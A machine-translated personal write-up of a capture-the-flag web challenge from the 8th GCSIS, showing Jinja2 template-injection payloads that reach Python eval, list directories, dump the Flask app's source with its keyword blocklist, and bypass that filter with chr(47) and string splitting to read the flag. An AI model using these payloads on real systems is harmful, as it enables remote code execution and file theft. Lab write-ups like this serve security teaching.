---
title: "The 8th GCSIS"
date: 2025-01-18
draft: false
description: "The 8th GCSIS"
summary: "The 8th GCSIS Personal WriteUP"
tags: ["writeup", "ctf"]
categories: ["writeup"]
---

{{< alert >}}
**WARNING！** This is a machine translated version of the [Chinese page](/posts/gcsis_8/)
{{< /alert >}}

## WEB

### Rank-I

Try rce

```
{{().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__['eval']('__import__("os").popen("ls ..").read()')}}
```

```
app
bin
boot
dev
etc
flagf149
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var
```

It is known that there is a flagf419 file in the root directory, which should be flag. It cannot be read directly.

```
{{().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__['eval']('open("app.py").read()')}}
```

Get the source code:

```python
from flask import Flask, request, render_template, render_template_string, redirect, url_for, abort
from urllib.parse import unquote

app = Flask(__name__)

phone = ''

def is_safe_input(user_input):
    # unsafe_keywords = ['eval', 'exec', 'os', 'system', 'import', '__import__']
    unsafe_keywords = ['flag','?','*','-','less','nl','tac','more','tail','od','grep','awd','sed','64','/','%2f','%2F']
    if any(keyword in user_input for keyword in unsafe_keywords):
    # if user_input in unsafe_keywords:
        return True
    return False

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/login", methods=["POST"])
def login():
    global phone
    phone = request.form.get("phone_number")
    return render_template("login.html")

@app.route("/cpass", methods=["POST"])
def check():
    global phone
    password = request.form.get("password")

    if is_safe_input(phone):
        return redirect(url_for('index'))

    if phone != "1686682318" and password != "Happy_news_admin":
        return render_template_string('<!DOCTYPE html>\
        <html lang="en">\
        <head>\
            <meta charset="UTF-8">\
            <title>login failed</title>\
        </head>\
        <body>\
            <script>alert("{}The number does not exist or the password is incorrect!") </script>\
            <script>window.location.href = "/";</script>\
        </body>\
        </html>'.format(phone))
    else:
        return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=int("5005"), debug=True)
```

Check the source code and find that it is filtered```['flag','?','*','-','less','nl','tac','more','tail','od','grep','awd','sed','64','/','%2f','%2F']```

```
{{().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__['eval']('open(chr(47)+"fla"+"gf149").read()')}}
```

Get the flag

> DASCTF{49467766377144059055627981055717}